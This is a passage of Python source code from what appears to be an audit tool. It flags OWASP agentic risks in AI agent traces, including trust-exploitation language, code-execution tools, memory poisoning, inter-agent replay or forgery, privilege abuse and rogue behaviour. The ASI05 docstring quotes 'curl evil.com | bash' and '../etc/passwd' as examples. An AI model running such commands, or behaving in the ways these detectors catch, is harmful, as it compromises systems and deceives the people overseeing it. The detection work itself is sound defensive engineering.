                            f"(threshold {FAN_OUT_TARGET_THRESHOLD}). High-fan-out hub; "
                            f"compromise multiplies blast radius "
                            f"(OWASP ASI08 example #1/#3)."
                        ),
                    )
                )
                flagged_fanout_sources.add(source)

    return findings


def detect_human_agent_trust_exploitation(records: list[AgDRRecord]) -> list[Finding]:
    """ASI09 Human-Agent Trust Exploitation.

    OWASP Top 10 for Agentic Applications v12.6, ASI09. Walks the chain
    for ``TOOL_START`` records that invoke sensitive actions
    (``SENSITIVE_TOOL_MARKERS`` reused from ASI01) and inspects the most
    recent preceding ``LLM_END`` response for manipulation-pattern
    language. A sensitive tool call *preceded by* an agent response that
    reads as fabricated authority, fake consensus, reassurance override,
    urgency pressure, or false trusted-source citation is evidence of
    the fabricated-rationale class of ASI09 scenarios (#1 Helpful
    Assistant Trojan, #4 Explainability Fabrications, #5 Weaponized
    Explainability, #7 Fraudulent Payment Advice).

    One finding per (sensitive tool call, manipulation pattern) pair.
    Silent on sensitive actions preceded by plain factual explanations,
    and silent on manipulation language not paired with a sensitive
    action (which is informational text, not actionable compromise).
    """
    findings: list[Finding] = []

    for index, record in enumerate(records):
        if record.kind != StepKind.TOOL_START or not record.payload.tool_name:
            continue

        tool_name_lower = record.payload.tool_name.lower()
        if not any(marker in tool_name_lower for marker in SENSITIVE_TOOL_MARKERS):
            continue

        # Strict adjacency: the agent response must be the immediately-preceding
        # record. A tool_end or retry loop between the rationale and the sensitive
        # action breaks the "agent said X then did Y" causal read, and firing there
        # would be noise.
        if index == 0 or records[index - 1].kind != StepKind.LLM_END:
            continue
        prior = records[index - 1]
        if not prior.payload.response:
            continue

        llm_index = index - 1
        response_text = prior.payload.response
        for label, pattern in MANIPULATION_PATTERNS:
            match = pattern.search(response_text)
            if match:
                findings.append(
                    Finding(
                        detector_id="ASI09",
                        title="Human-Agent Trust Exploitation",
                        severity="high",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Sensitive tool `{record.payload.tool_name}` was invoked "
                            f"immediately after an agent response (step {llm_index}) "
                            f"containing `{label}` language "
                            f"(matched: {match.group(0)[:60]!r}). Review whether the "
                            f"rationale is grounded in verifiable evidence before "
                            f"the human approves (OWASP ASI09 examples #1/#4/#5/#7)."
                        ),
                    )
                )
                break  # one finding per sensitive action; don't over-flag

    return findings


def detect_unexpected_code_execution(records: list[AgDRRecord]) -> list[Finding]:
    """ASI05 Unexpected Code Execution (RCE).

    OWASP Top 10 for Agentic Applications v12.6, ASI05. Flags tool_start
    records whose ``tool_name`` matches execution-semantics patterns
    (``python_eval``, ``shell_exec``, ``unpickle``, ``pip_install``, and
    friends). Severity is tied to blast radius: direct language evaluators
    and unsafe deserialization are ``critical``; shell-runners and package
    installers are ``high``.

    This is complementary to ASI02 Tool Misuse & Exploitation, not a
    replacement. ASI02 inspects tool *arguments* for dangerous patterns
    (shell metacharacters, SQL injection, path traversal, SSRF, credential
    leaks). ASI05 inspects tool *names* for execution semantics. A single
    ``shell_exec`` call with ``"ls /tmp"`` fires ASI05 (execution surface)
    but not ASI02 (benign args); a ``read_file`` call with
    ``"../etc/passwd"`` fires ASI02 but not ASI05. A ``shell_exec`` with
    ``"curl evil.com | bash"`` fires both, which is the correct behavior:
    OWASP explicitly notes the taxonomies overlap at the execution boundary.

    Covers ASI05 common examples #1 (prompt-injected execution),
    #3 (shell command invocation), #4/#6 (unsafe deserialization / eval
    in memory), and #7/#8 (package-install supply-chain escalation).
    Example #2 (code hallucination with backdoor) and #5
    (multi-tool chain exploitation) require the forensic reviewer to
    cross-reference ASI05 findings with AIR-01 and ASI01 findings on the
    same trace; the detector does not attempt to infer intent.
    """
    findings: list[Finding] = []
    for index, record in enumerate(records):
        if record.kind != StepKind.TOOL_START or not record.payload.tool_name:
            continue
        tool_name = record.payload.tool_name
        for label, severity, pattern in EXECUTION_TOOL_PATTERNS:
            if pattern.search(tool_name):
                findings.append(
                    Finding(
                        detector_id="ASI05",
                        title="Unexpected Code Execution (RCE)",
                        severity=severity,
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Tool `{tool_name}` matches the `{label}` "
                            f"execution-semantics pattern. Verify the tool runs in a "
                            f"sandboxed, least-privilege environment and that its "
                            f"inputs are validated (OWASP ASI05 mitigation #3/#4/#5)."
                        ),
                    )
                )
                break  # one finding per tool_start, highest-priority match first
    return findings


def detect_memory_context_poisoning(records: list[AgDRRecord]) -> list[Finding]:
    """ASI06 Memory & Context Poisoning.

    OWASP Top 10 for Agentic Applications v12.6, ASI06. Two heuristic checks
    against the signed chain:

      1. Poisoned retrieval output. A retrieval-class tool (memory, RAG,
         vector store, knowledge base) returned content containing
         prompt-injection-shaped instructions. Evidence that the memory or
         retrieval store is seeded with attacker content that is about to
         influence the agent's next reasoning step. Covers OWASP ASI06
         examples #1 (RAG/embeddings poisoning) and #3 (context-window
         manipulation surfacing through retrieval).
      2. Poisoned memory write. A memory-write-class tool (save_context,
         vector_upsert, kb_write, memorize, ...) was invoked with arguments
         containing prompt-injection-shaped instructions. Evidence that the
         agent is about to persist attacker-influenced content into long-term
         memory, enabling systemic misalignment or trigger backdoors across
         sessions (OWASP ASI06 examples #4 and #5).

    Tool-name matching uses substring checks against ``RETRIEVAL_TOOL_MARKERS``
    and ``MEMORY_WRITE_TOOL_MARKERS``. Content matching reuses the AIR-01
    ``INJECTION_PATTERNS``, which is appropriate here because poisoned
    memory is almost always prompt-injection in persistence. Heuristic only:
    false positives on legitimate meta-discussion of prompts are possible;
    auditors should cross-reference flagged entries against the memory
    source's provenance before concluding compromise.

    Cross-agent propagation (OWASP example #6) requires multi-trace analysis
    and is deliberately out of scope for single-trace detection.
    """
    findings: list[Finding] = []

    for index, record in enumerate(records):
        if record.kind == StepKind.TOOL_START and record.payload.tool_name and record.payload.tool_args:
            name_lower = record.payload.tool_name.lower()
            if any(marker in name_lower for marker in MEMORY_WRITE_TOOL_MARKERS):
                arg_blob = " ".join(str(v) for v in record.payload.tool_args.values())
                for label, pattern in INJECTION_PATTERNS:
                    match = pattern.search(arg_blob)
                    if match:
                        findings.append(
                            Finding(
                                detector_id="ASI06",
                                title="Memory & Context Poisoning",
                                severity="critical",
                                step_id=record.step_id,
                                step_index=index,
                                description=(
                                    f"Memory-write tool `{record.payload.tool_name}` "
                                    f"invoked with argument matching injection pattern "
                                    f"`{label}` (matched: {match.group(0)[:60]!r}). "
                                    f"Persisting this risks long-term memory poisoning "
                                    f"across sessions (OWASP ASI06 example #4/#5)."
                                ),
                            )
                        )
                        break
            continue

        if record.kind == StepKind.TOOL_END and index > 0:
            prior = records[index - 1]
            if prior.kind != StepKind.TOOL_START or not prior.payload.tool_name:
                continue
            name_lower = prior.payload.tool_name.lower()
            if not any(marker in name_lower for marker in RETRIEVAL_TOOL_MARKERS):
                continue
            output = record.payload.tool_output or ""
            for label, pattern in INJECTION_PATTERNS:
                match = pattern.search(output)
                if match:
                    findings.append(
                        Finding(
                            detector_id="ASI06",
                            title="Memory & Context Poisoning",
                            severity="high",
                            step_id=record.step_id,
                            step_index=index,
                            description=(
                                f"Retrieval tool `{prior.payload.tool_name}` returned "
                                f"content matching injection pattern `{label}` "
                                f"(matched: {match.group(0)[:60]!r}). The memory or "
                                f"retrieval store may be poisoned "
                                f"(OWASP ASI06 example #1/#3)."
                            ),
                        )
                    )
                    break

    return findings


def detect_insecure_inter_agent_communication(records: list[AgDRRecord]) -> list[Finding]:
    """ASI07 Insecure Inter-Agent Communication.

    OWASP Top 10 for Agentic Applications v12.6, ASI07. Walks
    ``AGENT_MESSAGE`` records for five failure modes:

      1. Missing identity (source_agent_id or target_agent_id empty).
         Covers OWASP example #1 (unauthenticated channel).
      2. Missing message_id (per-message nonce). Without one, replay
         cannot be detected at all. Covers a subset of example #3;
         flagged once per sender/receiver pair to avoid noise.
      3. Sender/key mismatch: the same source_agent_id has signed with
         a different Ed25519 key than was first observed in this session.
         Covers example #5 (A2A descriptor forgery / impersonation).
      4. Replay: the same message_id appears twice in the session.
         Covers example #3 (replay on trust chains).
      5. Protocol downgrade: the pair (source, target) previously used
         message_id, now omits it. Covers example #4.

    Message tampering (example #2) is caught upstream by chain
    verification (``agdr.verify_chain``); a tampered AGENT_MESSAGE record
    fails signature verification before this detector runs.

    Metadata analysis (example #6) is out of scope: it is a monitoring
    primitive, not a detection signal.
    """
    findings: list[Finding] = []

    claimed_keys: dict[str, str] = {}
    seen_message_ids: set[str] = set()
    pair_used_message_id: dict[tuple[str, str], bool] = {}
    pair_flagged_no_msgid: set[tuple[str, str]] = set()

    for index, record in enumerate(records):
        if record.kind != StepKind.AGENT_MESSAGE:
            continue

        src = record.payload.source_agent_id
        dst = record.payload.target_agent_id
        msg_id = record.payload.message_id
        key = record.signer_key

        # Check 1: missing identity.
        if not src or not dst:
            missing = "source_agent_id" if not src else "target_agent_id"
            findings.append(
                Finding(
                    detector_id="ASI07",
                    title="Insecure Inter-Agent Communication",
                    severity="high",
                    step_id=record.step_id,
                    step_index=index,
                    description=(
                        f"agent_message at step {index} missing {missing}. "
                        f"Inter-agent messages must carry both sender and receiver identity "
                        f"for channel authentication (OWASP ASI07 example #1)."
                    ),
                )
            )
            # Without a source we cannot run sender-scoped checks on this record.
            continue

        pair = (src, dst)

        # Check 3: sender/key mismatch (impersonation / descriptor forgery).
        if src in claimed_keys and claimed_keys[src] != key:
            findings.append(
                Finding(
                    detector_id="ASI07",
                    title="Insecure Inter-Agent Communication",
                    severity="critical",
                    step_id=record.step_id,
                    step_index=index,
                    description=(
                        f"Agent `{src}` previously signed with key {claimed_keys[src][:16]}..., "
                        f"but this message is signed with {key[:16]}... "
                        f"Possible A2A descriptor forgery or agent impersonation "
                        f"(OWASP ASI07 example #5)."
                    ),
                )
            )
        else:
            claimed_keys.setdefault(src, key)

        # Checks 2, 4, 5: message_id handling.
        if msg_id:
            if msg_id in seen_message_ids:
                findings.append(
                    Finding(
                        detector_id="ASI07",
                        title="Insecure Inter-Agent Communication",
                        severity="high",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"message_id `{msg_id}` already observed earlier in this session. "
                            f"Possible replay on trust chains (OWASP ASI07 example #3)."
                        ),
                    )
                )
            else:
                seen_message_ids.add(msg_id)
            pair_used_message_id[pair] = True
        else:
            if pair_used_message_id.get(pair):
                # Check 5: downgrade (pair previously had a nonce, now omits it).
                findings.append(
                    Finding(
                        detector_id="ASI07",
                        title="Insecure Inter-Agent Communication",
                        severity="high",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Pair `{src}` -> `{dst}` previously exchanged nonced messages; "
                            f"message at step {index} omits message_id. "
                            f"Possible protocol downgrade (OWASP ASI07 example #4)."
                        ),
                    )
                )
            elif pair not in pair_flagged_no_msgid:
                # Check 2: no replay defense at all for this pair.
                pair_flagged_no_msgid.add(pair)
                findings.append(
                    Finding(
                        detector_id="ASI07",
                        title="Insecure Inter-Agent Communication",
                        severity="medium",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Pair `{src}` -> `{dst}` exchanges agent messages without "
                            f"message_id nonces. Replay attacks on this pair cannot be detected "
                            f"(OWASP ASI07 example #3)."
                        ),
                    )
                )

    return findings


def _attribute_agent(
    record: AgDRRecord,
    by_id: dict[str, AgentDescriptor],
    by_signer_key: dict[str, AgentDescriptor],
) -> AgentDescriptor | None:
    """Resolve which registered agent is responsible for a record.

    Trust order: a claimed ``source_agent_id`` whose registered ``signer_key``
    matches the record's actual ``signer_key`` is attributed to that entry.
    When no source is claimed, we fall back to a direct ``signer_key`` lookup.
    A mismatched claim returns ``None`` so scope rules are not applied to an
    identity the record cannot substantiate.
    """
    src = record.payload.source_agent_id
    signer_key_lc = record.signer_key.lower()
    if src:
        registered = by_id.get(src)
        if registered is None:
            # Fall back to signer-key attribution for unregistered claims.
            return by_signer_key.get(signer_key_lc)
        if registered.signer_key.lower() != signer_key_lc:
            return None
        return registered
    return by_signer_key.get(signer_key_lc)


def detect_identity_privilege_abuse(
    records: list[AgDRRecord],
    registry: AgentRegistry | None,
) -> list[Finding]:
    """ASI03 Identity & Privilege Abuse: Zero-Trust-for-agents enforcement.

    OWASP Top 10 for Agentic Applications v12.6, ASI03. Checks the signed
    chain against an operator-declared ``AgentRegistry``. This detector is
    intentionally a **Zero-Trust enforcement** rule, not a learned-baseline
    anomaly detector: without a registry it returns no findings, because AIR
    refuses to fabricate identity claims from an implicit model.

    Findings emitted:

      1. ``identity forgery`` (critical): a record claims ``source_agent_id``
         X, the registry has X with signing key K, but the record is signed
         with a different key. Covers OWASP ASI03 example #1 (unauthorized
         agent impersonation) and example #2 (stolen or leaked keys).
      2. ``unknown agent`` (medium, dedup'd per agent_id): a record claims a
         ``source_agent_id`` that is not declared in the registry. Covers
         unregistered-agent activity in a policed environment.
      3. ``out-of-scope tool`` (high): a ``tool_start`` invokes a tool that
         is not in the attributed agent's ``permitted_tools``. Covers
         example #4 (scope creep beyond declared authorisation).
      4. ``privilege escalation`` (critical): a ``tool_start`` invokes a tool
         whose required tier (from ``tool_privilege_tiers``) exceeds the
         attributed agent's ``privilege_tier``. Covers example #3 (privilege
         escalation via delegated task).

    Attribution preference: a matching (claim, signing-key) pair is trusted.
    A claim whose signing key does not match is flagged as forgery and scope
    rules are suppressed for that record, so one bad identity claim does not
    cascade into a pile of downstream "out-of-scope" noise.
    """
    if registry is None or not registry.agents:
        return []

    findings: list[Finding] = []
    by_id = {agent.id: agent for agent in registry.agents}
    by_signer_key = {agent.signer_key.lower(): agent for agent in registry.agents}
    flagged_unknown: set[str] = set()

    for index, record in enumerate(records):
        src = record.payload.source_agent_id

        if src:
            registered = by_id.get(src)
            if registered is None:
                if src not in flagged_unknown:
                    flagged_unknown.add(src)
                    findings.append(
                        Finding(
                            detector_id="ASI03",
                            title="Identity & Privilege Abuse",
                            severity="medium",
                            step_id=record.step_id,
                            step_index=index,
                            description=(
                                f"Record claims source_agent_id `{src}` but no agent with that "
                                f"id is declared in the registry. Unregistered agent activity "
                                f"in a policed environment (OWASP ASI03)."
                            ),
                        )
                    )
            elif registered.signer_key.lower() != record.signer_key.lower():
                findings.append(
                    Finding(
                        detector_id="ASI03",
                        title="Identity & Privilege Abuse",
                        severity="critical",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Record claims source_agent_id `{src}`, registered with signer_key "
                            f"{registered.signer_key[:16]}..., but the record is signed with "
                            f"{record.signer_key[:16]}.... Possible agent impersonation or "
                            f"stolen key (OWASP ASI03 example #1)."
                        ),
                    )
                )

        attributed = _attribute_agent(record, by_id, by_signer_key)
        if record.kind != StepKind.TOOL_START or attributed is None:
            continue

        tool_name = record.payload.tool_name or ""
        if not tool_name:
            continue

        if not attributed.allows_tool(tool_name):
            findings.append(
                Finding(
                    detector_id="ASI03",
                    title="Identity & Privilege Abuse",
                    severity="high",
                    step_id=record.step_id,
                    step_index=index,
                    description=(
                        f"Agent `{attributed.id}` invoked tool `{tool_name}`, which is not in "
                        f"its declared permitted_tools list. Scope creep beyond declared "
                        f"authorisation (OWASP ASI03 example #4)."
                    ),
                )
            )

        required_tier = registry.required_tier_for_tool(tool_name)
        if required_tier > attributed.privilege_tier:
            findings.append(
                Finding(
                    detector_id="ASI03",
                    title="Identity & Privilege Abuse",
                    severity="critical",
                    step_id=record.step_id,
                    step_index=index,
                    description=(
                        f"Agent `{attributed.id}` (tier {attributed.privilege_tier}) invoked "
                        f"tool `{tool_name}`, which requires tier {required_tier}. Privilege "
                        f"escalation via delegated task (OWASP ASI03 example #3)."
                    ),
                )
            )

    return findings


def _parse_hour_utc(timestamp: str) -> int | None:
    """Extract the UTC hour (0..23) from an ISO 8601 timestamp string.

    Returns ``None`` on malformed input. AIR writes timestamps in UTC with a
    trailing ``Z``; this helper also accepts explicit ``+00:00`` offsets.
    """
    if not timestamp:
        return None
    value = timestamp.replace("Z", "+00:00")
    try:
        parsed = datetime.fromisoformat(value)
    except ValueError:
        return None
    return parsed.astimezone(UTC).hour


def detect_rogue_agent(
    records: list[AgDRRecord],
    registry: AgentRegistry | None,
) -> list[Finding]:
    """ASI10 Rogue Agents: Zero-Trust behavioral-scope enforcement.

    OWASP Top 10 for Agentic Applications v12.6, ASI10. Enforces the
    operator-declared ``BehavioralScope`` on each agent in the registry.
    This detector is explicitly **Zero-Trust enforcement**, not anomaly
    detection against a learned baseline: findings only fire when an
    agent's declared scope is breached. Without a declared scope, no
    findings are emitted.

    The learned-baseline variant (statistical profiling, peer comparison
    across agents) is not shipped in v0.3 and is scheduled for a future
    release. Shipping that variant responsibly requires a training-data
    collection pattern AIR does not yet provide.

    Findings emitted, per agent whose registry entry declares a
    ``behavioral_scope`` block:

      1. ``unexpected tool`` (high, dedup'd per (agent, tool)): a
         ``tool_start`` invokes a tool not in ``expected_tools``. The tool
         may be permitted by ASI03, but it is outside the agent's declared
         operational pattern. ASI10 flags *what the agent normally does*;
         ASI03 flags *what the agent is allowed to do*.
      2. ``fan-out breach`` (high, dedup'd per agent): the agent has sent
         ``agent_message`` records to more distinct targets than
         ``max_fan_out_targets`` allows for the session.
      3. ``off-hours activity`` (medium): any record whose UTC hour falls
         outside ``allowed_hours_utc``.
      4. ``session tool budget exceeded`` (high, dedup'd per agent): the
         agent's cumulative ``tool_start`` count exceeds
         ``max_session_tool_calls``.

    Attribution re-uses ``_attribute_agent`` so a forged-identity record
    (see ASI03) does not cascade into spurious ASI10 findings against the
    agent whose key was forged.
    """
    if registry is None or not registry.agents:
        return []

    findings: list[Finding] = []
    by_id = {agent.id: agent for agent in registry.agents}
    by_signer_key = {agent.signer_key.lower(): agent for agent in registry.agents}

    tool_count: dict[str, int] = defaultdict(int)
    fan_out_targets: dict[str, set[str]] = defaultdict(set)
    flagged_unexpected: set[tuple[str, str]] = set()
    flagged_budget: set[str] = set()
    flagged_fan_out: set[str] = set()

    for index, record in enumerate(records):
        attributed = _attribute_agent(record, by_id, by_signer_key)
        if attributed is None or attributed.behavioral_scope is None:
            continue
        scope = attributed.behavioral_scope
        agent_id = attributed.id

        if scope.allowed_hours_utc is not None and scope.allowed_hours_utc:
            hour = _parse_hour_utc(record.timestamp)
            if hour is not None and hour not in scope.allowed_hours_utc:
                findings.append(
                    Finding(
                        detector_id="ASI10",
                        title="Rogue Agents",
                        severity="medium",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Agent `{agent_id}` acted at hour {hour:02d} UTC, outside its "
                            f"declared allowed_hours_utc window. Zero-Trust behavioral-scope "
                            f"breach (OWASP ASI10 Rogue Agents)."
                        ),
                    )
                )

        if record.kind == StepKind.TOOL_START:
            tool_name = record.payload.tool_name or ""
            tool_count[agent_id] += 1

            if (
                scope.expected_tools
                and tool_name
                and tool_name not in scope.expected_tools
            ):
                key = (agent_id, tool_name)
                if key not in flagged_unexpected:
                    flagged_unexpected.add(key)
                    findings.append(
                        Finding(
                            detector_id="ASI10",
                            title="Rogue Agents",
                            severity="high",
                            step_id=record.step_id,
                            step_index=index,
                            description=(
                                f"Agent `{agent_id}` invoked tool `{tool_name}`, which is "
                                f"outside its declared expected_tools operational scope. "
                                f"The tool may be permitted by authorisation (ASI03), but it "
                                f"is not what this agent normally does. Zero-Trust "
                                f"behavioral-scope breach (OWASP ASI10 Rogue Agents)."
                            ),
                        )
                    )

            if (
                scope.max_session_tool_calls is not None
                and tool_count[agent_id] > scope.max_session_tool_calls
                and agent_id not in flagged_budget
            ):
                flagged_budget.add(agent_id)
                findings.append(
                    Finding(
                        detector_id="ASI10",
                        title="Rogue Agents",
                        severity="high",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Agent `{agent_id}` issued {tool_count[agent_id]} tool "
                            f"invocations, exceeding its declared max_session_tool_calls "
                            f"of {scope.max_session_tool_calls}. Zero-Trust session budget "
                            f"breached (OWASP ASI10 Rogue Agents)."
                        ),
                    )
                )

        if record.kind == StepKind.AGENT_MESSAGE:
            target = record.payload.target_agent_id
            if target:
                fan_out_targets[agent_id].add(target)
                if (
                    scope.max_fan_out_targets is not None
                    and len(fan_out_targets[agent_id]) > scope.max_fan_out_targets
                    and agent_id not in flagged_fan_out
                ):
                    flagged_fan_out.add(agent_id)
                    findings.append(
                        Finding(
                            detector_id="ASI10",
                            title="Rogue Agents",
                            severity="high",
                            step_id=record.step_id,
                            step_index=index,
                            description=(
                                f"Agent `{agent_id}` messaged "
                                f"{len(fan_out_targets[agent_id])} distinct targets in the "
                                f"session, exceeding its declared max_fan_out_targets of "
                                f"{scope.max_fan_out_targets}. Zero-Trust behavioral envelope "
                                f"breached (OWASP ASI10 Rogue Agents)."
                            ),
                        )
                    )

    return findings


def run_detectors(
    records: list[AgDRRecord],
    registry: AgentRegistry | None = None,
) -> list[Finding]:
    """Run every implemented detector and return a flat list of findings.

    ``registry`` is optional; when supplied, it enables the Zero-Trust-for-
    agents detectors (ASI03 today; ASI10 on the roadmap) that check the
    signed chain against declared identity and scope. When omitted, those
    detectors return no findings rather than fabricating an implicit
    baseline.
    """
    return [
        *detect_goal_hijack(records),
        *detect_tool_misuse(records),
        *detect_identity_privilege_abuse(records, registry),
        *detect_prompt_injection(records),
        *detect_sensitive_data_exposure(records),
        *detect_mcp_supply_chain_risk(records),
        *detect_resource_consumption(records),
        *detect_untraceable_action(records),
        *detect_unexpected_code_execution(records),
        *detect_memory_context_poisoning(records),
        *detect_human_agent_trust_exploitation(records),
        *detect_insecure_inter_agent_communication(records),
        *detect_cascading_failures(records),
        *detect_rogue_agent(records, registry),
    ]
